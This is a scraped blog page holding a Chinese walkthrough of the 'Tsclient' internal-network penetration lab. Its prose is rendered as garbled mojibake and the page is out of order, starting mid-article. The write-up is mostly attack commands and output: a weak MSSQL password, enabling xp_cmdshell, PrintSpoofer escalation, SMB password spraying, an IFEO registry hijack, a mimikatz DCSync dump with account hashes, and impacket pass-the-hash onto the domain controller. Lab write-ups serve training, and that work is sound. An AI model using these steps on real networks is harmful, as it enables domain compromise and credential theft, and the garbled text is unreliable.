(signing:False) (SMBv1:True)\rSMB 172.22.8.31 445 WIN19-CLIENT [*] Windows 10 / Server 2019 Build 17763 x64 (name:WIN19-CLIENT) (domain:xiaorang.lab) (signing:False) (SMBv1:False)\rSMB 172.22.8.46 445 WIN2016 [-] xiaorang.lab\\Aldrich:Ald@rLMWuy7Z STATUS_LOGON_FAILURE\rSMB 172.22.8.15 445 DC01 [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:xiaorang.lab) (signing:True) (SMBv1:False)\rSMB 172.22.8.18 445 WIN-WEB [-] WIN-WEB\\Aldrich:Ald@rLMWuy7Z STATUS_LOGON_FAILURE\rSMB 172.22.8.31 445 WIN19-CLIENT [-] xiaorang.lab\\Aldrich:Ald@rLMWuy7Z STATUS_LOGON_FAILURE\rSMB 172.22.8.15 445 DC01 [-] xiaorang.lab\\Aldrich:Ald@rLMWuy7Z STATUS_LOGON_FAILURE å¯ä»¥çœ‹åˆ°è¿™ä¸‰å°æœºè²Œä¼¼éƒ½èƒ½ç™»ä¸Šå»\nSMB 172.22.8.46 445 WIN2016 [*] Windows Server 2016 Datacenter 14393 x64 (name:WIN2016) (domain:xiaorang.lab) (signing:False) (SMBv1:True)\rSMB 172.22.8.31 445 WIN19-CLIENT [*] Windows 10 / Server 2019 Build 17763 x64 (name:WIN19-CLIENT) (domain:xiaorang.lab) (signing:False) (SMBv1:False)\rSMB 172.22.8.15 445 DC01 [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:xiaorang.lab) (signing:True) (SMBv1:False) æˆ‘è¿™é‡Œé€‰æ‹©ç™»31\nproxychains4 rdesktop 172.22.8.31 -u Aldrich -d xiaorang.lab -p 'Ald@rLMWuy7Z!#' è¿™é‡Œè¦ç”¨rdesktopç™»ï¼Œrdpç™»ä¸ä¸Š\nä¼šæç¤ºå¯†ç è¿‡æœŸï¼Œæ”¹ä¸ªå¯†ç å°±è¡Œäº†\nä½†æ˜¯æ”¹å®Œå¯†ç è¿™å°æœºè¿˜æ˜¯ç™»ä¸ä¸Šï¼Œæ²¡æœ‰ç™»é™†æƒé™\næ‰€ä»¥æˆ‘ä»¬å°è¯•ç”¨è¿™ä¸ªä¿®æ”¹åçš„è´¦å·å¯†ç å†å»ç™»è¿™ä¸ªè´¦å·çš„å¦ä¸€å°æœºå­\næˆåŠŸåœ¨46ä¸­ç™»å…¥ï¼Œåé¢è¿˜æ˜¯ç”¨rdpå§ï¼Œrdesktopä¹Ÿå¤ªå¡äº†\nxiaorang.lab\\Aldrich\rAbc123456 FLAG2 ä¿¡æ¯æ”¶é›†ä¸€ä¸‹\nå¯ä»¥çœ‹åˆ°æˆ‘ä»¬å·²ç»æ‹¿ä¸‹åŸŸå†…çš„ä¸€å°æœºå­äº†\nsysteminfo æ¥ç€æˆ‘ä»¬ç”¨bloodhoundæ¥è¿›è¡Œä¸€ä¸‹åŸŸå†…ä¿¡æ¯æ”¶é›†\nSharpHound.exe -c all å°†æ•°æ®é‡‡é›†å®Œç”Ÿæˆçš„zipæ–‡ä»¶ï¼Œä¸Šä¼ å¯¼å…¥åˆ°BloodHoundåˆ†æ\nä»å›¾ä¸­ï¼Œæˆ‘ä»¬ä¼šå‘ç°46è¿™å°æœºå­çš„ç”¨æˆ·æ˜¯åŸŸç®¡ï¼Œé‚£æˆ‘ä»¬æ¥ä¸‹æ¥å°±è¦æƒ³åŠæ³•åœ¨è¿™å°æœºå­ä¸Šææƒï¼Œç„¶åæ‹¿ä¸‹åŸŸæ§\næ ¹æ®å‰é¢çš„hint\nDo you know how to hijack Image? æˆ‘ä»¬å¯ä»¥çŸ¥é“æ¥ä¸‹æ¥è¦è¿›è¡Œé•œåƒåŠ«æŒ(IFEO)ææƒ\nGet-ACL -Path \"HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\" | fl è¿™æ¡å‘½ä»¤çš„æ„æ€æ˜¯è·å–æŒ‡å®šæ³¨å†Œè¡¨è·¯å¾„çš„è®¿é—®æ§åˆ¶åˆ—è¡¨ï¼ˆACLï¼‰ã€‚\nNT AUTHORITY\\Authenticated Users æˆ‘ä»¬å¯ä»¥å‘ç°å…¨éƒ¨å·²ç™»å½•ç”¨æˆ·éƒ½å¯ä»¥å¯¹æ³¨å†Œè¡¨è¿›è¡Œä¿®æ”¹\né‚£æˆ‘ä»¬å°±å¯ä»¥é€šè¿‡ä¿®æ”¹æ³¨å†Œè¡¨è¿›è¡Œæ˜ åƒåŠ«æŒ\næˆ‘ä»¬è¿™é‡Œé€šè¿‡å°†æ”¾å¤§é•œå¯åŠ¨çš„magnify.exeæ›¿æ¢æˆC:\\windows\\system32\\cmd.exeï¼Œæ¥è¿›è¡Œææƒ\n1REG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\magnify.exe\" /v Debugger /t REG_SZ /d \"C:\\windows\\system32\\cmd.exe\" ä¿®æ”¹åé€‰æ‹©é”å®š\nåœ¨é”å®šé¡µé¢é€‰æ‹©æ”¾å¤§é•œå³å¯\ntype c:\\Users\\Administrator\\flag\\flag02.txt æ¥ç€æˆ‘ä»¬å¯ä»¥æ–°å»ºä¸€ä¸ªç”¨æˆ·è®©rdpå¯ä»¥è¿ä¸Šå»\nFLAG3 æ¥ä¸‹æ¥å°±æ˜¯å¸¸è§„çš„å°†åŸŸå†…ç”¨æˆ·çš„å“ˆå¸Œdumpä¸‹æ¥\nmimikatz.exe \"lsadump::dcsync /domain:xiaorang.lab /all /csv\" exit \u003e mimikatz.txt ç»“æœ\n.#####. mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08\r.## ^ ##. \"A La Vie, A L'Amour\" - (oe.eo)\r## / \\ ## /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )\r## \\ / ## \u003e https://blog.gentilkiwi.com/mimikatz\r'## v ##' Vincent LE TOUX ( vincent.letoux@gmail.com )\r'#####' \u003e https://pingcastle.com / https://mysmartlogon.com ***/\rmimikatz(commandline) # lsadump::dcsync /domain:xiaorang.lab /all /csv\r[DC] 'xiaorang.lab' will be the domain\r[DC] 'DC01.xiaorang.lab' will be the DC server\r[DC] Exporting domain 'xiaorang.lab'\r[rpc] Service : ldap\r[rpc] AuthnSvc : GSS_NEGOTIATE (9)\r502\tkrbtgt\t3ffd5b58b4a6328659a606c3ea6f9b63\t514\r1000\tDC01$\t7408967f1fd3c2ff807232b7b5c5fc95\t532480\r500\tAdministrator\t2c9d81bdcf3ec8b1def10328a7cc2f08\t512\r1103\tWIN2016$\taae3dca76f254c52708ee076935bb533\t16781312\r1104\tWIN19-CLIENT$\t7c011200ecbe666945e465c200afcb5e\t16781312\r1105\tAldrich\t0607f770c2f37e09a850e09e920a9f45\t512\rmimikatz(commandline) # exit\rBye! ä¹‹åå°±å¯ä»¥è¿›è¡Œæ¨ªå‘ç§»åŠ¨äº†\nproxychains4 impacket-smbexec -hashes :2c9d81bdcf3ec8b1def10328a7cc2f08 xiaorang.lab/administrator@172.22.8.15 -codec gbk type c:\\users\\administrator\\flag\\flag03.txt æ‹¿åˆ°æœ€åä¸€ä¸ªflag\nC:\\Windows\\system32\u003etype c:\\users\\administrator\\flag\\flag03.txt\r_________ __ _ _\r| _ _ | [ | (_) / |_\r|_/ | | \\_|.--. .---. | | __ .---. _ .--. `| |-'\r| | ( (`\\] / /'`\\] | | [ |/ /__\\\\[ `.-. | | |\r_| |_ `'.'. | \\__. | | | || \\__., | | | | | |,\r|_____| [\\__) )'.___.'[___][___]'.__.'[___||__]\\__/\rCongratulations! ! !\rflag03: flag{410202d3-2e47-4619-a6b0-96051a985f2e} è¿™é¢˜ç”¨csæ‰“ä¼šæ–¹ä¾¿å¾ˆå¤šï¼Œä½†æ˜¯ä¸€å¼€å§‹æ²¡è€ƒè™‘åˆ°ï¼Œæ‰€ä»¥åé¢ä¹Ÿä¸€ç›´æ²¡ç”¨ã€‚\n",
  "wordCount" : "3480",
  "inLanguage": "zh",
  "image": "https://i.postimg.cc/7hwBy7VS/calcr.png","datePublished": "2025-03-12T22:03:55+08:00",
  "dateModified": "2025-03-12T22:03:55+08:00",
  "author":{
    "@type": "Person",
    "name": "Xrntkk"
  },
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "http://localhost:1313/post/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-tsclient-writeup/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "Xrntkk's Blog",
    "logo": {
      "@type": "ImageObject",
      "url": "http://localhost:1313/favicon.ico"
    }
  }
}
</script>
</head>

<body class=" dark" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    }

</script>

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="http://localhost:1313/" accesskey="h" title="Xrntkk&#39;s Blog (Alt + H)">Xrntkk&#39;s Blog</a>
            <div class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </div>
        </div>
        <ul id="menu">
            <li>
                <a href="http://localhost:1313/" title="Xrntkk&#39;s Blog">
                    <span>é¦–é¡µğŸ“”</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:1313/archives/" title="å½’æ¡£">
                    <span>å½’æ¡£ğŸ—ƒï¸</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:1313/tags/" title="Tags">
                    <span>æ ‡ç­¾ğŸ”–</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:1313/search/" title="æœç´¢">
                    <span>æœç´¢ğŸ”</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:1313/links/" title="å‹é“¾ğŸˆ">
                    <span>å‹é“¾ğŸˆ</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:1313/about/" title="å…³äº">
                    <span>å…³äºğŸ‘¨â€ğŸ’»</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    
    <h1 class="post-title entry-hint-parent">
      æ˜¥ç§‹äº‘é•œ-Tsclient-Writeup
    </h1>
<div class="post-meta"><span title='2025-03-12 22:03:55 +0800 CST'>2025-03-12</span>&nbsp;Â·&nbsp;7 åˆ†é’Ÿ&nbsp;Â·&nbsp;Xrntkk

<div class="meta-item">&nbspÂ·&nbsp
  <span id="busuanzi_container_page_pv">Readings: <span id="busuanzi_value_page_pv"></span></span>
  </div>      
</div>
  </header> <div class="toc">
    <details >
        <summary accesskey="c" title="(Alt + C)">
            <span class="details">ç›®å½•</span>
        </summary>

        <div class="inner"><ul>
                <li>
                    <a href="#flag1" aria-label="FLAG1">FLAG1</a></li>
                <li>
                    <a href="#flag2" aria-label="FLAG2">FLAG2</a></li>
                <li>
                    <a href="#flag3" aria-label="FLAG3">FLAG3</a>
                </li>
            </ul>
        </div>
    </details>
</div>

  <div class="post-content"><p>Tsclientæ˜¯ä¸€å¥—éš¾åº¦ä¸ºä¸­ç­‰çš„é¶åœºç¯å¢ƒï¼Œå®Œæˆè¯¥æŒ‘æˆ˜å¯ä»¥å¸®åŠ©ç©å®¶äº†è§£å†…ç½‘æ¸—é€ä¸­çš„ä»£ç†è½¬å‘ã€å†…ç½‘æ‰«æã€ä¿¡æ¯æ”¶é›†ã€ç‰¹æƒæå‡ä»¥åŠæ¨ªå‘ç§»åŠ¨æŠ€æœ¯æ–¹æ³•ï¼ŒåŠ å¼ºå¯¹åŸŸç¯å¢ƒæ ¸å¿ƒè®¤è¯æœºåˆ¶çš„ç†è§£ï¼Œä»¥åŠæŒæ¡åŸŸç¯å¢ƒæ¸—é€ä¸­ä¸€äº›æœ‰è¶£çš„æŠ€æœ¯è¦ç‚¹ã€‚è¯¥é¶åœºå…±æœ‰3ä¸ªflagï¼Œåˆ†å¸ƒäºä¸åŒçš„é¶æœºã€‚</p>
<blockquote>
<p>å‚è€ƒæ–‡ç« </p>
<p><a href="https://www.cnblogs.com/kingbridge/articles/17645128.html">æ˜¥ç§‹äº‘é•œ TSclient &ndash; Walkthrough - KingBridge - åšå®¢å›­</a></p>
<p><a href="https://bowuchuling.github.io/posts/chunqiu_Tsclient">æ˜¥ç§‹äº‘å¢ƒ Tsclient | åˆé›¶Â·b10g~ğŸ¥</a></p></blockquote>
<h3 id="flag1">FLAG1<a hidden class="anchor" aria-hidden="true" href="#flag1">#</a></h3>
<p><img alt="image-20250309183544076" loading="lazy" src="../assets/image-20250309183544076.png"></p>
<p>å…ˆç”¨fscanæ‰«ä¸€ä¸‹</p>
<p><img alt="image-20250309184512071" loading="lazy" src="../assets/image-20250309184512071.png">
mssqlæœåŠ¡æ˜¯å¼±å£ä»¤</p>
<pre tabindex="0"><code>sa/1qaz!QAZ
</code></pre><p>ç”¨æ•°æ®åº“ç®¡ç†å·¥å…·è¿ä¸Šå»</p>
<p><img alt="image-20250309190358640" loading="lazy" src="../assets/image-20250309190358640.png"></p>
<p>æ¥ä¸‹æ¥è¦çœ‹mssqlæ€ä¹ˆè¿›è¡Œå‘½ä»¤æ‰§è¡Œ</p>
<p>å‚è€ƒæ–‡ç« ï¼š</p>
<p><a href="https://xz.aliyun.com/news/7129">https://xz.aliyun.com/news/7129</a></p>
<p>åˆ¤æ–­xp_cmdshellçŠ¶æ€</p>
<pre tabindex="0"><code>select * from master.dbo.sysobjects where xtype=&#39;x&#39; and name=&#39;xp_cmdshell&#39;
</code></pre><p><img alt="image-20250309190544521" loading="lazy" src="../assets/image-20250309190544521.png"></p>
<p>å­˜åœ¨</p>
<p>é‚£æˆ‘ä»¬æ¥ä¸‹æ¥å¯åŠ¨å®ƒ</p>
<pre tabindex="0"><code>EXEC sp_configure &#39;show advanced options&#39;, 1;RECONFIGURE;EXEC sp_configure &#39;xp_cmdshell&#39;, 1;RECONFIGURE;
</code></pre><pre tabindex="0"><code>é…ç½®é€‰é¡¹ &#39;xp_cmdshell&#39; å·²ä» 0 æ›´æ”¹ä¸º 1ã€‚è¯·è¿è¡Œ RECONFIGURE è¯­å¥è¿›è¡Œå®‰è£…ã€‚
</code></pre><p>å¯åŠ¨æˆåŠŸ</p>
<p>æ¥ä¸‹æ¥å°±å¯ä»¥è¿›è¡Œå‘½ä»¤æ‰§è¡Œäº†</p>
<pre tabindex="0"><code>exec master..xp_cmdshell &#39;whoami&#39;
</code></pre><p><img alt="image-20250309190932671" loading="lazy" src="../assets/image-20250309190932671.png"></p>
<p>æ¥ä¸‹æ¥ç›´æ¥vshellä¸€å¥è¯ä¸Šçº¿</p>
<p><img alt="image-20250309192014708" loading="lazy" src="../assets/image-20250309192014708.png"></p>
<p>æ²¡æ‰¾åˆ°flagï¼Œå‘ç°Administratoræ–‡ä»¶å¤¹æ²¡æœ‰æƒé™</p>
<p>æƒ³åˆ°è¦ææƒï¼Œä¼ ä¸€ä¸ªPrintSpooferè¿›è¡Œææƒ</p>
<p><a href="https://github.com/whojeff/PrintSpoofer">https://github.com/whojeff/PrintSpoofer</a></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="ln">1</span><span class="cl">PrintSpoofer.exe -i -c cmd
</span></span></code></pre></div><p><img alt="image-20250312192829416" loading="lazy" src="../assets/image-20250312192829416.png"></p>
<p>ææƒä¹‹åæ‹¿åˆ°flag</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="ln"> 1</span><span class="cl">C<span class="p">:</span><span class="nl">\Tmp</span><span class="c1">&gt;type C:\Users\Administrator\flag\flag01.txt</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl"> _________  ________  ________  ___       ___  _______   ________   _________
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="p">|</span>\___   ___\\   ____\<span class="p">|</span>\   ____\<span class="p">|</span>\  \     <span class="p">|</span>\  \<span class="p">|</span>\  ___ \ <span class="p">|</span>\   ___  \<span class="p">|</span>\___   ___\
</span></span><span class="line"><span class="ln"> 4</span><span class="cl">\<span class="p">|</span>___ \  \_\ \  \___<span class="p">|</span>\ \  \___<span class="p">|</span>\ \  \    \ \  \ \   __/<span class="p">|</span>\ \  \\ \  \<span class="p">|</span>___ \  \_<span class="p">|</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl">     \ \  \ \ \_____  \ \  \    \ \  \    \ \  \ \  \_<span class="p">|</span>/_\ \  \\ \  \   \ \  \
</span></span><span class="line"><span class="ln"> 6</span><span class="cl">      \ \  \ \<span class="p">|</span>____<span class="p">|</span>\  \ \  \____\ \  \____\ \  \ \  \_<span class="p">|</span>\ \ \  \\ \  \   \ \  \
</span></span><span class="line"><span class="ln"> 7</span><span class="cl">       \ \__\  ____\_\  \ \_______\ \_______\ \__\ \_______\ \__\\ \__\   \ \__\
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">        \<span class="p">|</span>__<span class="p">|</span> <span class="p">|</span>\_________\<span class="p">|</span>_______<span class="p">|</span>\<span class="p">|</span>_______<span class="p">|</span>\<span class="p">|</span>__<span class="p">|</span>\<span class="p">|</span>_______<span class="p">|</span>\<span class="p">|</span>__<span class="p">|</span> \<span class="p">|</span>__<span class="p">|</span>    \<span class="p">|</span>__<span class="p">|</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl">              \<span class="p">|</span>_________<span class="p">|</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">
</span></span><span class="line"><span class="ln">11</span><span class="cl">
</span></span><span class="line"><span class="ln">12</span><span class="cl">Getting flag01 is easy, right?
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl">flag01: flag{5ee60dcf-4f7b-4e2a-977e-cbf1697d8df4}
</span></span><span class="line"><span class="ln">15</span><span class="cl">
</span></span><span class="line"><span class="ln">16</span><span class="cl">
</span></span><span class="line"><span class="ln">17</span><span class="cl">Maybe you should focus on user sessions...
</span></span></code></pre></div><p>ææƒä¹‹åç”¨ææƒåçš„è´¦æˆ·é‡æ–°ä¸Šä¸€ä¸‹çº¿</p>
<p>æ¥ä¸‹æ¥ç”¨fscanæ‰«ä¸€ä¸‹å†…ç½‘</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="ln"> 1</span><span class="cl">â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">â”‚    ___                              _        â”‚
</span></span><span class="line"><span class="ln"> 3</span><span class="cl">â”‚   / _ \     ___  ___ _ __ __ _  ___<span class="p">|</span> <span class="p">|</span> __    â”‚
</span></span><span class="line"><span class="ln"> 4</span><span class="cl">â”‚  / /_\/____/ __<span class="p">|</span>/ __<span class="p">|</span> &#39;__/ _` <span class="p">|</span>/ __<span class="p">|</span> <span class="p">|</span>/ /    â”‚
</span></span><span class="line"><span class="ln"> 5</span><span class="cl">â”‚ / /_\\_____\__ \ (__<span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="p">(</span>_<span class="p">|</span> <span class="p">|</span> <span class="p">(</span>__<span class="p">|</span>   <span class="p">&lt;</span>     â”‚
</span></span><span class="line"><span class="ln"> 6</span><span class="cl">â”‚ \____/     <span class="p">|</span>___/\___<span class="p">|</span>_<span class="p">|</span>  \__,_<span class="p">|</span>\___<span class="p">|</span>_<span class="p">|</span>\_\    â”‚
</span></span><span class="line"><span class="ln"> 7</span><span class="cl">â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">      Fscan Version: 2.0.0
</span></span><span class="line"><span class="ln"> 9</span><span class="cl">
</span></span><span class="line"><span class="ln">10</span><span class="cl">[2025-03-09 19:53:19] [INFO] æš´åŠ›ç ´è§£çº¿ç¨‹æ•°: 1
</span></span><span class="line"><span class="ln">11</span><span class="cl">[2025-03-09 19:53:19] [INFO] å¼€å§‹ä¿¡æ¯æ‰«æ
</span></span><span class="line"><span class="ln">12</span><span class="cl">[2025-03-09 19:53:19] [INFO] CIDRèŒƒå›´: 172.22.8.0-172.22.8.255
</span></span><span class="line"><span class="ln">13</span><span class="cl">[2025-03-09 19:53:20] [INFO] ç”ŸæˆIPèŒƒå›´: 172.22.8.0.<span class="nv">%!d(string=172.22.8.255) - %!s(MISSING).%!</span>d(MISSING<span class="p">)</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl">[2025-03-09 19:53:20] [INFO] è§£æCIDR 172.22.8.0/24 -<span class="p">&gt;</span> IPèŒƒå›´ 172.22.8.0-172.22.8.255
</span></span><span class="line"><span class="ln">15</span><span class="cl">[2025-03-09 19:53:20] [INFO] æœ€ç»ˆæœ‰æ•ˆä¸»æœºæ•°é‡: 256
</span></span><span class="line"><span class="ln">16</span><span class="cl">[2025-03-09 19:53:20] [INFO] å¼€å§‹ä¸»æœºæ‰«æ
</span></span><span class="line"><span class="ln">17</span><span class="cl">[2025-03-09 19:53:20] [INFO] æ­£åœ¨å°è¯•æ— ç›‘å¬ICMPæ¢æµ‹...
</span></span><span class="line"><span class="ln">18</span><span class="cl">[2025-03-09 19:53:20] [INFO] å½“å‰ç”¨æˆ·æƒé™ä¸è¶³,æ— æ³•å‘é€ICMPåŒ…
</span></span><span class="line"><span class="ln">19</span><span class="cl">[2025-03-09 19:53:20] [INFO] åˆ‡æ¢ä¸ºPINGæ–¹å¼æ¢æµ‹...
</span></span><span class="line"><span class="ln">20</span><span class="cl">[2025-03-09 19:53:20] [SUCCESS] ç›®æ ‡ 172.22.8.31     å­˜æ´» (ICMP<span class="p">)</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">[2025-03-09 19:53:20] [SUCCESS] ç›®æ ‡ 172.22.8.18     å­˜æ´» (ICMP)
</span></span><span class="line"><span class="ln">22</span><span class="cl">[2025-03-09 19:53:20] [SUCCESS] ç›®æ ‡ 172.22.8.15     å­˜æ´» (ICMP)
</span></span><span class="line"><span class="ln">23</span><span class="cl">[2025-03-09 19:53:20] [SUCCESS] ç›®æ ‡ 172.22.8.46     å­˜æ´» (ICMP)
</span></span><span class="line"><span class="ln">24</span><span class="cl">[2025-03-09 19:53:23] [INFO] å­˜æ´»ä¸»æœºæ•°é‡: 4
</span></span><span class="line"><span class="ln">25</span><span class="cl">[2025-03-09 19:53:23] [INFO] æœ‰æ•ˆç«¯å£æ•°é‡: 233
</span></span><span class="line"><span class="ln">26</span><span class="cl">[2025-03-09 19:53:23] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.8.15:88
</span></span><span class="line"><span class="ln">27</span><span class="cl">[2025-03-09 19:53:23] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.8.46:80
</span></span><span class="line"><span class="ln">28</span><span class="cl">[2025-03-09 19:53:23] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.8.18:80
</span></span><span class="line"><span class="ln">29</span><span class="cl">[2025-03-09 19:53:24] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.8.18:139
</span></span><span class="line"><span class="ln">30</span><span class="cl">[2025-03-09 19:53:24] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.8.31:139
</span></span><span class="line"><span class="ln">31</span><span class="cl">[2025-03-09 19:53:24] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.8.46:135
</span></span><span class="line"><span class="ln">32</span><span class="cl">[2025-03-09 19:53:24] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.8.15:135
</span></span><span class="line"><span class="ln">33</span><span class="cl">[2025-03-09 19:53:24] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.8.31:135
</span></span><span class="line"><span class="ln">34</span><span class="cl">[2025-03-09 19:53:24] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.8.18:135
</span></span><span class="line"><span class="ln">35</span><span class="cl">[2025-03-09 19:53:24] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.8.46:139
</span></span><span class="line"><span class="ln">36</span><span class="cl">[2025-03-09 19:53:24] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.8.15:139
</span></span><span class="line"><span class="ln">37</span><span class="cl">[2025-03-09 19:53:24] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.8.46:445
</span></span><span class="line"><span class="ln">38</span><span class="cl">[2025-03-09 19:53:24] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.8.15:445
</span></span><span class="line"><span class="ln">39</span><span class="cl">[2025-03-09 19:53:24] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.8.31:445
</span></span><span class="line"><span class="ln">40</span><span class="cl">[2025-03-09 19:53:24] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.8.18:445
</span></span><span class="line"><span class="ln">41</span><span class="cl">[2025-03-09 19:53:24] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.8.15:389
</span></span><span class="line"><span class="ln">42</span><span class="cl">[2025-03-09 19:53:26] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.8.18:1433
</span></span><span class="line"><span class="ln">43</span><span class="cl">[2025-03-09 19:53:28] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.8.15:88 =&gt; 
</span></span><span class="line"><span class="ln">44</span><span class="cl">[2025-03-09 19:53:28] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.8.46:80 =<span class="p">&gt;</span> [http]
</span></span><span class="line"><span class="ln">45</span><span class="cl">[2025-03-09 19:53:28] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.8.18:80 =<span class="p">&gt;</span> [http]
</span></span><span class="line"><span class="ln">46</span><span class="cl">[2025-03-09 19:53:29] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.8.18:139 =<span class="p">&gt;</span>  Banner:[.]
</span></span><span class="line"><span class="ln">47</span><span class="cl">[2025-03-09 19:53:29] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.8.31:139 =<span class="p">&gt;</span>  Banner:[.]
</span></span><span class="line"><span class="ln">48</span><span class="cl">[2025-03-09 19:53:29] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.8.46:139 =<span class="p">&gt;</span>  Banner:[.]
</span></span><span class="line"><span class="ln">49</span><span class="cl">[2025-03-09 19:53:29] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.8.15:139 =<span class="p">&gt;</span>  Banner:[.]
</span></span><span class="line"><span class="ln">50</span><span class="cl">[2025-03-09 19:53:30] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.8.46:445 =&gt; 
</span></span><span class="line"><span class="ln">51</span><span class="cl">[2025-03-09 19:53:30] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.8.15:445 =&gt; 
</span></span><span class="line"><span class="ln">52</span><span class="cl">[2025-03-09 19:53:30] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.8.31:445 =&gt; 
</span></span><span class="line"><span class="ln">53</span><span class="cl">[2025-03-09 19:53:30] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.8.18:445 =&gt; 
</span></span><span class="line"><span class="ln">54</span><span class="cl">[2025-03-09 19:53:31] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.8.18:1433 =<span class="p">&gt;</span> [ms-sql-s] ç‰ˆæœ¬:13.00.1601 äº§å“:Microsoft SQL Server 2016 ç³»ç»Ÿ:Windows Banner:[.%.A.]
</span></span><span class="line"><span class="ln">55</span><span class="cl">[2025-03-09 19:53:35] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.8.15:389 =&gt; 
</span></span><span class="line"><span class="ln">56</span><span class="cl">[2025-03-09 19:54:29] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.8.15:135 =&gt; 
</span></span><span class="line"><span class="ln">57</span><span class="cl">[2025-03-09 19:54:29] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.8.46:135 =&gt; 
</span></span><span class="line"><span class="ln">58</span><span class="cl">[2025-03-09 19:54:29] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.8.31:135 =&gt; 
</span></span><span class="line"><span class="ln">59</span><span class="cl">[2025-03-09 19:54:29] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.8.18:135 =&gt; 
